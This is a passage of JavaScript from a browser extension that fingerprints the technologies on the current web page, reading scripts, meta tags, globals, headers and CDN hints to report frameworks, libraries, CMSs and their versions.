    const techCurrentUrl = document.getElementById('techCurrentUrl');
    const techResults = document.getElementById('techResults');
    const techEmptyState = document.getElementById('techEmptyState');

    try {
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!tab || !tab.url.startsWith('http')) {
            techCurrentUrl.textContent = 'URL tidak valid untuk scanning';
            techResults.classList.add('hidden');
            techEmptyState.classList.remove('hidden');
            return;
        }

        techCurrentUrl.textContent = tab.url;
        techEmptyState.classList.add('hidden');
        techResults.classList.remove('hidden');

        // Use inline function injection - AGGRESSIVE DETECTION
        const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
                const data = {
                    html: document.documentElement.outerHTML,
                    meta: {},
                    scripts: [],
                    inlineScripts: [],
                    links: [],
                    cookies: document.cookie,
                    url: window.location.href,
                    performance: [],
                    headers: {}
                };

                // Get Meta Tags
                document.querySelectorAll('meta').forEach(meta => {
                    const name = meta.getAttribute('name') || meta.getAttribute('property') || meta.getAttribute('http-equiv');
                    const content = meta.getAttribute('content');
                    if (name && content) {
                        data.meta[name.toLowerCase()] = content;
                    }
                });

                // Get Script Sources with version extraction from CDN patterns
                data.versions = {};
                document.querySelectorAll('script[src]').forEach(script => {
                    const src = script.src;
                    data.scripts.push(src);

                    // Extract versions from common CDN URL patterns
                    // cdnjs: /ajax/libs/jquery/3.6.0/
                    // unpkg: unpkg.com/react@18.2.0/
                    // jsdelivr: cdn.jsdelivr.net/npm/vue@3.3.4/
                    const versionPatterns = [
                        { name: 'jQuery', pattern: /jquery[\/\-@]?(\d+\.\d+\.\d+)/i },
                        { name: 'React', pattern: /react[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'Vue', pattern: /vue[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'Angular', pattern: /angular[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'Lodash', pattern: /lodash[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'moment', pattern: /moment[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'axios', pattern: /axios[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'bootstrap', pattern: /bootstrap[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'd3', pattern: /d3[\/\-@]v?(\d+\.\d+\.\d+)/i },
                        { name: 'chart', pattern: /chart\.?js[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'three', pattern: /three[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'gsap', pattern: /gsap[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'anime', pattern: /anime[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'swiper', pattern: /swiper[\/\-@](\d+\.\d+\.\d+)/i },
                        { name: 'tailwind', pattern: /tailwind[\/\-@](\d+\.\d+\.\d+)/i }
                    ];

                    for (const { name, pattern } of versionPatterns) {
                        const match = src.match(pattern);
                        if (match && !data.versions[name]) {
                            data.versions[name] = match[1];
                        }
                    }
                });

                // Get INLINE script content and extract versions
                document.querySelectorAll('script:not([src])').forEach(script => {
                    const text = script.textContent || '';
                    if (text.length < 100000) {
                        data.inlineScripts.push(text.substring(0, 10000));

                        // Look for version comments like /*! jQuery v3.6.0 */
                        const versionCommentPatterns = [
                            { name: 'jQuery', pattern: /jQuery\s+v?(\d+\.\d+\.\d+)/i },
                            { name: 'Lodash', pattern: /lodash\s+(\d+\.\d+\.\d+)/i },
                            { name: 'Bootstrap', pattern: /Bootstrap\s+v?(\d+\.\d+\.\d+)/i },
                            { name: 'React', pattern: /React\s+v?(\d+\.\d+\.\d+)/i },
                            { name: 'Vue', pattern: /Vue\.js\s+v?(\d+\.\d+\.\d+)/i },
                            { name: 'Angular', pattern: /angular[\s@]v?(\d+\.\d+\.\d+)/i }
                        ];

                        for (const { name, pattern } of versionCommentPatterns) {
                            const match = text.match(pattern);
                            if (match && !data.versions[name]) {
                                data.versions[name] = match[1];
                            }
                        }
                    }
                });

                // === AGGRESSIVE VERSION EXTRACTION FROM HTML COMMENTS ===
                const htmlContent = document.documentElement.outerHTML;
                const commentMatches = htmlContent.match(/<!--[\s\S]*?-->/g) || [];
                for (const comment of commentMatches) {
                    // WordPress: <!-- powered by WordPress 6.4.2 -->
                    const wpMatch = comment.match(/WordPress\s+(\d+\.\d+\.?\d*)/i);
                    if (wpMatch && !data.versions.WordPress) {
                        data.versions.WordPress = wpMatch[1];
                    }
                    // Drupal: <!-- Drupal 10.1.0 -->
                    const drupalMatch = comment.match(/Drupal\s+(\d+\.\d+\.?\d*)/i);
                    if (drupalMatch && !data.versions.Drupal) {
                        data.versions.Drupal = drupalMatch[1];
                    }
                    // Joomla
                    const joomlaMatch = comment.match(/Joomla!?\s+(\d+\.\d+\.?\d*)/i);
                    if (joomlaMatch && !data.versions.Joomla) {
                        data.versions.Joomla = joomlaMatch[1];
                    }
                    // Generic version comments
                    const genericMatch = comment.match(/(\w+)\s+v?(\d+\.\d+\.\d+)/i);
                    if (genericMatch && !data.versions[genericMatch[1]]) {
                        data.versions[genericMatch[1]] = genericMatch[2];
                    }
                }

                // === EXTRACT FROM GENERATOR META TAG ===
                const generatorMeta = document.querySelector('meta[name="generator"]');
                if (generatorMeta) {
                    const content = generatorMeta.getAttribute('content') || '';
                    data.versions._generator = content;

                    // WordPress 6.4.2
                    const wpGen = content.match(/WordPress\s+(\d+\.\d+\.?\d*)/i);
                    if (wpGen) data.versions.WordPress = wpGen[1];

                    // Drupal 10 (https://www.drupal.org)
                    const drupalGen = content.match(/Drupal\s+(\d+\.?\d*\.?\d*)/i);
                    if (drupalGen) data.versions.Drupal = drupalGen[1];

                    // Joomla! 4.3
                    const joomlaGen = content.match(/Joomla!?\s+(\d+\.\d+\.?\d*)/i);
                    if (joomlaGen) data.versions.Joomla = joomlaGen[1];

                    // TYPO3 CMS
                    const typo3Gen = content.match(/TYPO3\s+(\d+\.\d+\.?\d*)/i);
                    if (typo3Gen) data.versions.TYPO3 = typo3Gen[1];

                    // Hugo 0.120.4
                    const hugoGen = content.match(/Hugo\s+(\d+\.\d+\.?\d*)/i);
                    if (hugoGen) data.versions.Hugo = hugoGen[1];
                }

                // === EXTRACT VERSIONS FROM wp-includes/wp-content PATHS (WordPress specific) ===
                const wpScripts = document.querySelectorAll('script[src*="wp-includes"], script[src*="wp-content"]');
                wpScripts.forEach(s => {
                    const verMatch = s.src.match(/[?&]ver=(\d+\.\d+\.?\d*)/);
                    if (verMatch && !data.versions.WordPress) {
                        data.versions.WordPress = verMatch[1];
                    }
                });

                // === EXTRACT FROM DRUPAL drupalSettings ===
                if (window.drupalSettings && window.drupalSettings.path) {
                    data.versions.Drupal = 'detected';
                }

                // === LOOK FOR VERSION IN DATA ATTRIBUTES ===
                const elementsWithVersion = document.querySelectorAll('[data-version], [data-v], [data-app-version]');
                elementsWithVersion.forEach(el => {
                    const ver = el.dataset.version || el.dataset.v || el.dataset.appVersion;
                    if (ver && ver.match(/^\d+\.\d+/)) {
                        data.versions._dataAttr = ver;
                    }
                });

                // === WINDOW GLOBAL OBJECT VERSION EXTRACTION (MOST ACCURATE) ===
                // This directly reads the version from loaded library objects
                const globalVersions = {
                    // jQuery
                    'jQuery': () => window.jQuery?.fn?.jquery || window.$?.fn?.jquery,
                    // React
                    'React': () => window.React?.version,
                    // Vue
                    'Vue': () => window.Vue?.version,
                    // Angular (various versions)
                    'Angular': () => window.angular?.version?.full || window.ng?.VERSION?.full,
                    // Lodash
                    'Lodash': () => window._?.VERSION,
                    // Underscore
                    'Underscore': () => window._?.VERSION,
                    // Backbone
                    'Backbone': () => window.Backbone?.VERSION,
                    // Ember
                    'Ember': () => window.Ember?.VERSION,
                    // D3
                    'D3': () => window.d3?.version,
                    // Three.js
                    'Three.js': () => window.THREE?.REVISION,
                    // GSAP
                    'GSAP': () => window.gsap?.version,
                    // Chart.js
                    'Chart.js': () => window.Chart?.version,
                    // Leaflet
                    'Leaflet': () => window.L?.version,
                    // Moment.js
                    'Moment.js': () => window.moment?.version,
                    // Axios
                    'Axios': () => window.axios?.VERSION,
                    // Socket.io
                    'Socket.io': () => window.io?.version,
                    // Alpine.js
                    'Alpine.js': () => window.Alpine?.version,
                    // HTMX
                    'HTMX': () => window.htmx?.version,
                    // Anime.js
                    'Anime.js': () => window.anime?.version,
                    // Swiper
                    'Swiper': () => window.Swiper?.version,
                    // AOS
                    'AOS': () => window.AOS?.version,
                    // Popper
                    'Popper': () => window.Popper?.version,
                    // Bootstrap
                    'Bootstrap': () => window.bootstrap?.Tooltip?.VERSION
                };

                for (const [name, getter] of Object.entries(globalVersions)) {
                    try {
                        const version = getter();
                        if (version && !data.versions[name]) {
                            data.versions[name] = String(version);
                        }
                    } catch (e) { }
                }


                // Get Link hrefs (stylesheets, preloads, etc)
                document.querySelectorAll('link[href]').forEach(link => {
                    data.links.push({
                        href: link.href,
                        rel: link.rel,
                        type: link.type
                    });
                });

                // Get Performance entries for resource detection
                try {
                    const entries = performance.getEntriesByType('resource');
                    entries.forEach(e => {
                        data.performance.push(e.name);
                    });
                } catch (e) { }

                // ULTRA AGGRESSIVE GLOBALS DETECTION
                const w = window;

                // Detect React multiple ways
                const hasReact = !!(
                    w.React ||
                    w.__REACT_DEVTOOLS_GLOBAL_HOOK__ ||
                    document.querySelector('[data-reactroot]') ||
                    document.querySelector('[data-reactid]') ||
                    document.querySelector('#__next') ||
                    document.querySelector('[id^="__next"]')
                );

                // Extract Next.js version from scripts
                let nextVersion = null;
                const nextScripts = document.querySelectorAll('script[src*="_next"]');
                for (const s of nextScripts) {
                    // Pattern: /_next/static/chunks/webpack-xxx.js or similar
                    const vMatch = s.src.match(/next[\/\-@]?(\d+\.\d+\.\d+)/i);
                    if (vMatch) {
                        nextVersion = vMatch[1];
                        break;
                    }
                }
                // Also try to get from __NEXT_DATA__
                if (w.__NEXT_DATA__ && !nextVersion) {
                    try {
                        // Sometimes version is in buildId pattern
                        const nextDataScript = document.getElementById('__NEXT_DATA__');
                        if (nextDataScript) {
                            const json = JSON.parse(nextDataScript.textContent);
                            // Check for version in various places
                            if (json.buildId) nextVersion = json.buildId;
                            // Try to find version in runtimeConfig
                            if (json.runtimeConfig?.version) nextVersion = json.runtimeConfig.version;
                            if (json.nextVersion) nextVersion = json.nextVersion;
                        }
                    } catch (e) { }
                }

                // Search inline scripts for Next.js version patterns
                for (const script of data.inlineScripts) {
                    // Pattern: "next":"14.0.3" or next@14.0.3
                    const patterns = [
                        /"next"\s*:\s*"(\d+\.\d+\.\d+)"/i,
                        /next@(\d+\.\d+\.\d+)/i,
                        /Next\.js\s+v?(\d+\.\d+\.\d+)/i,
                        /__NEXT_VERSION__\s*=\s*["'](\d+\.\d+\.\d+)["']/i
                    ];
                    for (const pattern of patterns) {
                        const match = script.match(pattern);
                        if (match) {
                            nextVersion = match[1];
                            break;
                        }
                    }
                    if (nextVersion && /^\d+\.\d+/.test(nextVersion)) break;
                }

                // Get Next.js version from package.json comment in chunk files
                for (const perf of data.performance) {
                    const vMatch = perf.match(/next[\/\-@](\d+\.\d+\.\d+)/i);
                    if (vMatch) {
                        nextVersion = vMatch[1];
                        break;
                    }
                }

                data.globals = {
                    // Core Frameworks - ENHANCED
                    jQuery: !!w.jQuery, jQueryVersion: w.jQuery?.fn?.jquery,
                    React: hasReact,
                    ReactVersion: w.React?.version || null,
                    ReactDOM: !!w.ReactDOM, ReactDOMVersion: w.ReactDOM?.version,
                    Vue: !!w.Vue, VueVersion: w.Vue?.version,
                    angular: !!w.angular, angularVersion: w.angular?.version?.full,
                    ng: !!w.ng,
                    __NEXT_DATA__: !!w.__NEXT_DATA__,
                    NextVersion: nextVersion,
                    __NUXT__: !!w.__NUXT__,
                    Svelte: !!w.__svelte,
                    Ember: !!w.Ember, EmberVersion: w.Ember?.VERSION,
                    Backbone: !!w.Backbone, BackboneVersion: w.Backbone?.VERSION,
                    Preact: !!w.preact,
                    Alpine: !!w.Alpine,
                    Solid: !!w._$HY,
                    Remix: !!w.__remixManifest,
                    Gatsby: !!w.___gatsby,

                    // Libraries
                    _: !!w._, lodashVersion: w._?.VERSION,
                    moment: !!w.moment, momentVersion: w.moment?.version,
                    dayjs: !!w.dayjs,
                    luxon: !!w.luxon,
                    axios: !!w.axios,
                    gsap: !!w.gsap, gsapVersion: w.gsap?.version,
                    TweenMax: !!w.TweenMax,
                    anime: !!w.anime,
                    Lottie: !!w.lottie || !!w.LottiePlayer,

                    // Visualization
                    d3: !!w.d3, d3Version: w.d3?.version,
                    Chart: !!w.Chart, ChartVersion: w.Chart?.version,
                    Highcharts: !!w.Highcharts, HighchartsVersion: w.Highcharts?.version,
                    ApexCharts: !!w.ApexCharts,
                    echarts: !!w.echarts,
                    THREE: !!w.THREE, THREEVersion: w.THREE?.REVISION,

                    // UI Components
                    Swiper: !!w.Swiper,
                    Splide: !!w.Splide,
                    Slick: !!w.jQuery?.fn?.slick,
                    Owl: !!w.jQuery?.fn?.owlCarousel,
                    Lightbox: !!w.lightbox || !!w.GLightbox,
                    Fancybox: !!w.Fancybox,

                    // Editors
                    Monaco: !!w.monaco,
                    CodeMirror: !!w.CodeMirror, CodeMirrorVersion: w.CodeMirror?.version,
                    Ace: !!w.ace,
                    Quill: !!w.Quill,
                    TinyMCE: !!w.tinymce, TinyMCEVersion: w.tinymce?.majorVersion,
                    CKEditor: !!w.CKEDITOR || !!w.ClassicEditor,
                    Prism: !!w.Prism,
                    hljs: !!w.hljs,

                    // State Management
                    Redux: !!w.Redux,
                    MobX: !!w.mobx,
                    Vuex: !!w.Vuex,
                    Pinia: !!w.pinia,
                    Zustand: !!w.zustand,
                    Recoil: !!w.Recoil,

                    // Math/Scientific
                    KaTeX: !!w.katex, KaTeXVersion: w.katex?.version,
                    MathJax: !!w.MathJax, MathJaxVersion: w.MathJax?.version,

                    // Utils
                    Hammer: !!w.Hammer,
                    Popper: !!w.Popper,
                    Tippy: !!w.tippy,
                    SweetAlert: !!w.Swal || !!w.swal,
                    Toastr: !!w.toastr,
                    Notyf: !!w.Notyf,

                    // Animation
                    ScrollMagic: !!w.ScrollMagic,
                    ScrollTrigger: !!w.ScrollTrigger,
                    AOS: !!w.AOS,
                    WOW: !!w.WOW,
                    Rellax: !!w.Rellax,
                    Parallax: !!w.Parallax,

                    // Analytics
                    ga: !!w.ga || !!w.gtag,
                    dataLayer: !!w.dataLayer,
                    fbq: !!w.fbq,
                    hj: !!w.hj,
                    mixpanel: !!w.mixpanel,
                    amplitude: !!w.amplitude,
                    analytics: !!w.analytics,
                    posthog: !!w.posthog,
                    heap: !!w.heap,
                    clarity: !!w.clarity,

                    // Marketing/Chat
                    Intercom: !!w.Intercom,
                    Drift: !!w.drift,
                    Zendesk: !!w.zE,
                    Crisp: !!w.$crisp,
                    Tawk: !!w.Tawk_API,
                    HubSpot: !!w._hsq || !!w.HubSpotConversations,

                    // Other
                    io: !!w.io,
                    Stripe: !!w.Stripe,
                    PayPal: !!w.paypal,
                    grecaptcha: !!w.grecaptcha,
                    hcaptcha: !!w.hcaptcha,
                    turnstile: !!w.turnstile,

                    // Build tools markers
                    webpackJsonp: !!w.webpackJsonp || !!w.webpackChunk,
                    __webpack_modules__: !!w.__webpack_modules__,
                    parcelRequire: !!w.parcelRequire,
                    System: !!w.System?.import,
                    require: typeof w.require === 'function' && !!w.require.defined,

                    // Polyfills
                    Promise: w.Promise?.toString().includes('native code'),
                    fetch: w.fetch?.toString().includes('native code'),

                    // Zone.js (Angular)
                    Zone: !!w.Zone, ZoneVersion: w.Zone?.__zone_symbol__UNPATCHED_EVENTS ? 'detected' : null
                };

                // Extract ng-version from DOM
                const ngEl = document.querySelector('[ng-version]');
                if (ngEl) data.globals.angularVersion = ngEl.getAttribute('ng-version');

                // Extract data-reactroot
                if (document.querySelector('[data-reactroot]') || document.querySelector('[data-reactid]')) {
                    data.globals.React = true;
                }

                // Check for lit-html
                if (document.querySelector('[__lit]') || w.litHtmlVersions) {
                    data.globals.litHtml = true;
                }

                // NEXT.JS VERSION EXTRACTION
                if (w.__NEXT_DATA__) {
                    data.globals.__NEXT_DATA__ = true;
                    // Try to extract Next.js version from buildId or script tags
                    const nextScripts = document.querySelectorAll('script[src*="_next"]');
                    for (const s of nextScripts) {
                        const vMatch = s.src.match(/\/_next\/static\/([^\/]+)\//);
                        if (vMatch) {
                            data.globals.NextBuildId = vMatch[1];
                        }
                    }
                }

                // TAILWIND CSS DETECTION - More aggressive
                const hasTailwind = !!(
                    document.querySelector('[class*="flex "]') ||
                    document.querySelector('[class*="grid "]') ||
                    document.querySelector('[class*="bg-"]') ||
                    document.querySelector('[class*="text-"]') ||
                    document.querySelector('[class*="p-"]') ||
                    document.querySelector('[class*="m-"]') ||
                    document.querySelector('[class*="w-"]') ||
                    document.querySelector('[class*="h-"]') ||
                    document.querySelector('[class*="rounded"]') ||
                    document.querySelector('[class*="shadow"]') ||
                    (document.body?.className || '').match(/\b(flex|grid|p-\d|m-\d|w-\d|h-\d|bg-|text-)\b/)
                );
                if (hasTailwind) {
                    data.globals.Tailwind = true;
                }

                // PROTOCOL DETECTION (HTTP/2, HTTP/3)
                try {
                    const perf = performance.getEntriesByType('navigation')[0];
                    if (perf && perf.nextHopProtocol) {
                        data.protocol = perf.nextHopProtocol;
                    }
                } catch (e) { }

                // CDN AND CLOUD DETECTION FROM PERFORMANCE ENTRIES
                const allResources = [...data.scripts, ...data.performance];
                data.cdns = {
                    s3: allResources.some(r => r.includes('s3.amazonaws.com') || r.includes('.s3.') || r.includes('s3-')),
                    cloudfront: allResources.some(r => r.includes('cloudfront.net')),
                    aws: allResources.some(r => r.includes('amazonaws.com') || r.includes('aws.')),
                    vercel: allResources.some(r => r.includes('vercel.') || r.includes('_vercel')),
                    netlify: allResources.some(r => r.includes('netlify.') || r.includes('netlify.app')),
                    cloudflare: allResources.some(r => r.includes('cloudflare') || r.includes('cdnjs.cloudflare.com')),
                    jsdelivr: allResources.some(r => r.includes('jsdelivr.net')),
                    unpkg: allResources.some(r => r.includes('unpkg.com')),
                    googleCloud: allResources.some(r => r.includes('googleapis.com') || r.includes('storage.googleapis.com')),
                    firebase: allResources.some(r => r.includes('firebase') || r.includes('firebaseapp.com'))
                };

                // Check document classes and attributes
                data.bodyClasses = document.body?.className || '';
                data.htmlClasses = document.documentElement?.className || '';

                // Detect TypeScript (from source maps or .ts references)
                const hasTypeScript = data.scripts.some(s => s.includes('.ts') || s.includes('typescript'));
                if (hasTypeScript) data.globals.TypeScript = true;

                // Detect Java backend
                const hasJava = data.cookies.includes('JSESSIONID') || document.querySelector('[action*=".jsp"]') || data.html.includes('.jsp');
                if (hasJava) data.globals.Java = true;

                return data;
            }
        });

        if (results && results[0] && results[0].result) {
            const domData = results[0].result;

            // Fetch captured headers from background script
            try {
                const headerResponse = await chrome.runtime.sendMessage({
                    action: 'getTechHeaders',
                    tabId: tab.id
                });

                if (headerResponse && headerResponse.headers) {
                    domData.serverHeaders = headerResponse.headers;
                    console.log('[Tech Detector] Got headers from background:', headerResponse.headers);
                }
            } catch (e) {
                console.warn('Could not get headers from background:', e);
            }

            // Fetch versions from chunk files (for Next.js, React, etc.)
            if (domData.scripts && domData.scripts.some(s => s.includes('/_next/'))) {
                try {
                    const versionResponse = await chrome.runtime.sendMessage({
                        action: 'fetchTechVersions',
                        url: tab.url,
                        scripts: domData.scripts
                    });

                    if (versionResponse && versionResponse.versions) {
                        domData.fetchedVersions = versionResponse.versions;
                        console.log('[Tech Detector] Got versions from chunks:', versionResponse.versions);
                    }
                } catch (e) {
                    console.warn('Could not fetch versions:', e);
                }
            }

            matchTechnologies(domData);
        } else {
            techEmptyState.classList.remove('hidden');
            techResults.classList.add('hidden');
        }
    } catch (e) {
        console.error('Scan failed:', e);
        techCurrentUrl.textContent = 'Error: ' + e.message;
        techEmptyState.classList.remove('hidden');
        techResults.classList.add('hidden');
    }
}

function matchTechnologies(data) {
    if (!fingerprints) return;

    // Initialize all categories from fingerprints dynamically
    const detections = {};
    for (const cat of Object.keys(fingerprints)) {
        detections[cat] = [];
    }

    // Already detected names (to avoid duplicates)
    const detected = new Set();

    // === PROCESS SERVER HEADERS FROM BACKGROUND SCRIPT ===
    if (data.serverHeaders && data.serverHeaders.techIndicators) {
        const ti = data.serverHeaders.techIndicators;
        const server = detections.Server || [];
        const fw = detections.Frameworks || [];
        const paas = detections.PaaS || [];
        const prog = detections['Programming languages'] || [];
        const misc = detections.Miscellaneous || [];

        // Server detection from Server header
        if (ti.serverName) {
            const sn = ti.serverName.toLowerCase();
            if (sn.includes('nginx')) {
                server.push({ name: 'nginx', version: ti.serverVersion });
                detected.add('nginx');
            } else if (sn.includes('apache')) {
                server.push({ name: 'Apache', version: ti.serverVersion });
                detected.add('Apache');
            } else if (sn.includes('cloudflare')) {
                misc.push({ name: 'Cloudflare', version: null });
                detected.add('Cloudflare');
            } else if (sn.includes('microsoft-iis') || sn.includes('iis')) {
                server.push({ name: 'IIS', version: ti.serverVersion });
                detected.add('IIS');
            } else if (sn.includes('lighttpd')) {
                server.push({ name: 'Lighttpd', version: ti.serverVersion });
                detected.add('Lighttpd');
            } else if (sn.includes('gunicorn')) {
                server.push({ name: 'Gunicorn', version: ti.serverVersion });
                detected.add('Gunicorn');
            } else if (sn.includes('openresty')) {
                server.push({ name: 'OpenResty', version: ti.serverVersion });
                detected.add('OpenResty');
            }
        }

        // X-Powered-By detection
        if (ti.poweredByName) {
            const pb = ti.poweredByName.toLowerCase();
            if (pb.includes('php')) {
                prog.push({ name: 'PHP', version: ti.poweredByVersion });
                detected.add('PHP');
            } else if (pb.includes('asp.net') || pb.includes('aspnet')) {
                fw.push({ name: 'ASP.NET', version: ti.poweredByVersion });
                detected.add('ASP.NET');
            } else if (pb.includes('express')) {
                fw.push({ name: 'Express', version: ti.poweredByVersion });
                detected.add('Express');
            } else if (pb.includes('next')) {
                fw.push({ name: 'Next.js', version: ti.poweredByVersion });
                detected.add('Next.js');
            } else if (pb.includes('nuxt')) {
                fw.push({ name: 'Nuxt.js', version: ti.poweredByVersion });
                detected.add('Nuxt.js');
            } else if (pb.includes('django')) {
                fw.push({ name: 'Django', version: ti.poweredByVersion });
                detected.add('Django');
            } else if (pb.includes('flask')) {
                fw.push({ name: 'Flask', version: ti.poweredByVersion });
                detected.add('Flask');
            } else if (pb.includes('rails') || pb.includes('ruby')) {
                fw.push({ name: 'Ruby on Rails', version: ti.poweredByVersion });
                detected.add('Ruby on Rails');
            } else if (pb.includes('laravel')) {
                fw.push({ name: 'Laravel', version: ti.poweredByVersion });
                detected.add('Laravel');
            }
        }

        // ASP.NET versions
        if (ti.aspNet && !detected.has('ASP.NET')) {
            fw.push({ name: 'ASP.NET', version: ti.aspNet });
            detected.add('ASP.NET');
        }
        if (ti.aspNetMvc) {
            fw.push({ name: 'ASP.NET MVC', version: ti.aspNetMvc });
            detected.add('ASP.NET MVC');
        }

        // CDN/Hosting from headers
        if (ti.cloudfront && !detected.has('Amazon CloudFront')) {
            paas.push({ name: 'Amazon CloudFront', version: null });
            detected.add('Amazon CloudFront');
        }
        if (ti.cloudflare && !detected.has('Cloudflare')) {
            misc.push({ name: 'Cloudflare', version: null });
            detected.add('Cloudflare');
        }
        if (ti.vercel && !detected.has('Vercel')) {
            paas.push({ name: 'Vercel', version: null });
            detected.add('Vercel');
        }
        if (ti.netlify && !detected.has('Netlify')) {
            paas.push({ name: 'Netlify', version: null });
            detected.add('Netlify');
        }
        if (ti.firebase && !detected.has('Firebase')) {
            paas.push({ name: 'Firebase', version: null });
            detected.add('Firebase');
        }

        // CMS from headers
        if (ti.drupal) {
            const cms = detections.CMS || [];
            cms.push({ name: 'Drupal', version: null });
            detected.add('Drupal');
        }
        if (ti.shopify) {
            const ecom = detections.Ecommerce || [];
            ecom.push({ name: 'Shopify', version: null });
            detected.add('Shopify');
        }
        if (ti.wix) {
            const cms = detections.CMS || [];
            cms.push({ name: 'Wix', version: null });
            detected.add('Wix');
        }

        // Framework cookies detection
        if (ti.php && !detected.has('PHP')) {
            prog.push({ name: 'PHP', version: null });
            detected.add('PHP');
        }
        if (ti.java && !detected.has('Java')) {
            prog.push({ name: 'Java', version: null });
            detected.add('Java');
        }
        if (ti.laravel && !detected.has('Laravel')) {
            fw.push({ name: 'Laravel', version: null });
            detected.add('Laravel');
        }
        if (ti.nextjs && !detected.has('Next.js')) {
            fw.push({ name: 'Next.js', version: null });
            detected.add('Next.js');
        }

        // Varnish cache
        if (ti.varnish) {
            server.push({ name: 'Varnish', version: null });
            detected.add('Varnish');
        }

        // X-Generator
        if (ti.generator) {
            const gen = ti.generator;
            if (gen.toLowerCase().includes('wordpress')) {
                const cms = detections.CMS || [];
                const vMatch = gen.match(/(\d+\.\d+\.?\d*)/);
                cms.push({ name: 'WordPress', version: vMatch ? vMatch[1] : null });
                detected.add('WordPress');
            } else if (gen.toLowerCase().includes('drupal')) {
                const cms = detections.CMS || [];
                const vMatch = gen.match(/(\d+\.\d+\.?\d*)/);
                cms.push({ name: 'Drupal', version: vMatch ? vMatch[1] : null });
                detected.add('Drupal');
            } else if (gen.toLowerCase().includes('joomla')) {
                const cms = detections.CMS || [];
                const vMatch = gen.match(/(\d+\.\d+\.?\d*)/);
                cms.push({ name: 'Joomla', version: vMatch ? vMatch[1] : null });
                detected.add('Joomla');
            }
        }
    }

    // Direct detection from globals (most reliable) with versions
    // Use data.versions as fallback for CDN-extracted versions
    const v = data.versions || {};
    const fv = data.fetchedVersions || {}; // Versions from chunk file parsing

    if (data.globals) {
        const g = data.globals;
        const libs = detections['JavaScript libraries'] || [];
        const fw = detections.Frameworks || [];
        const ui = detections['UI frameworks'] || [];
        const analytics = detections.Analytics || [];
        const marketing = detections.Marketing || [];
        const security = detections.Security || [];
        const ecommerce = detections.Ecommerce || [];
        const misc = detections.Miscellaneous || [];
        const paas = detections.PaaS || [];

        // === CORE FRAMEWORKS ===
        if (g.jQuery) { libs.push({ name: 'jQuery', version: g.jQueryVersion || v.jQuery }); detected.add('jQuery'); }
        if (g.React && !detected.has('React')) {
            fw.push({ name: 'React', version: fv.react || g.ReactVersion || v.React });
            detected.add('React');
        }
        if (g.ReactDOM) { libs.push({ name: 'ReactDOM', version: g.ReactDOMVersion || fv.react || v.React }); detected.add('ReactDOM'); }
        if (g.Vue) { fw.push({ name: 'Vue.js', version: g.VueVersion || v.Vue }); detected.add('Vue.js'); }
        if (g.angular || g.ng) { fw.push({ name: 'Angular', version: g.angularVersion || v.Angular }); detected.add('Angular'); }
        if (g.__NEXT_DATA__ && !detected.has('Next.js')) {
            fw.push({ name: 'Next.js', version: fv.nextjs || g.NextVersion || null });
            detected.add('Next.js');
        }
        if (g.__NUXT__) { fw.push({ name: 'Nuxt.js', version: null }); detected.add('Nuxt.js'); }
        if (g.Svelte) { fw.push({ name: 'Svelte', version: null }); detected.add('Svelte'); }
        if (g.Ember) { fw.push({ name: 'Ember.js', version: g.EmberVersion }); detected.add('Ember.js'); }
        if (g.Backbone) { fw.push({ name: 'Backbone.js', version: g.BackboneVersion }); detected.add('Backbone.js'); }
        if (g.Preact) { fw.push({ name: 'Preact', version: null }); detected.add('Preact'); }
        if (g.Alpine) { fw.push({ name: 'Alpine.js', version: null }); detected.add('Alpine.js'); }
        if (g.Solid) { fw.push({ name: 'Solid', version: null }); detected.add('Solid'); }
        if (g.Remix) { fw.push({ name: 'Remix', version: null }); detected.add('Remix'); }
        if (g.Gatsby) { fw.push({ name: 'Gatsby', version: null }); detected.add('Gatsby'); }
        if (g.Zone) { libs.push({ name: 'Zone.js', version: g.ZoneVersion }); detected.add('Zone.js'); }

        // === JS LIBRARIES ===
        if (g._) { libs.push({ name: 'Lodash', version: g.lodashVersion || v.Lodash || null }); detected.add('Lodash'); }
        if (g.moment) { libs.push({ name: 'Moment.js', version: g.momentVersion || v.moment || null }); detected.add('Moment.js'); }
        if (g.dayjs) { libs.push({ name: 'Day.js', version: null }); detected.add('Day.js'); }
        if (g.luxon) { libs.push({ name: 'Luxon', version: null }); detected.add('Luxon'); }
        if (g.axios) { libs.push({ name: 'Axios', version: v.axios || null }); detected.add('Axios'); }
        if (g.io) { libs.push({ name: 'Socket.io', version: null }); detected.add('Socket.io'); }
        if (g.litHtml) { libs.push({ name: 'lit-html', version: null }); detected.add('lit-html'); }

        // === ANIMATION ===
        if (g.gsap) { libs.push({ name: 'GSAP', version: g.gsapVersion || v.gsap }); detected.add('GSAP'); }
        if (g.TweenMax) { libs.push({ name: 'TweenMax', version: null }); detected.add('TweenMax'); }
        if (g.anime) { libs.push({ name: 'anime.js', version: v.anime }); detected.add('anime.js'); }
        if (g.Lottie) { libs.push({ name: 'Lottie', version: null }); detected.add('Lottie'); }
        if (g.AOS) { libs.push({ name: 'AOS', version: null }); detected.add('AOS'); }
        if (g.WOW) { libs.push({ name: 'WOW.js', version: null }); detected.add('WOW.js'); }
        if (g.ScrollMagic) { libs.push({ name: 'ScrollMagic', version: null }); detected.add('ScrollMagic'); }
        if (g.ScrollTrigger) { libs.push({ name: 'ScrollTrigger', version: null }); detected.add('ScrollTrigger'); }
        if (g.Rellax) { libs.push({ name: 'Rellax', version: null }); detected.add('Rellax'); }
        if (g.Parallax) { libs.push({ name: 'Parallax.js', version: null }); detected.add('Parallax.js'); }

        // === VISUALIZATION ===
        if (g.d3) { libs.push({ name: 'D3.js', version: g.d3Version }); detected.add('D3.js'); }
        if (g.Chart) { libs.push({ name: 'Chart.js', version: g.ChartVersion }); detected.add('Chart.js'); }
        if (g.Highcharts) { libs.push({ name: 'Highcharts', version: g.HighchartsVersion }); detected.add('Highcharts'); }
        if (g.ApexCharts) { libs.push({ name: 'ApexCharts', version: null }); detected.add('ApexCharts'); }
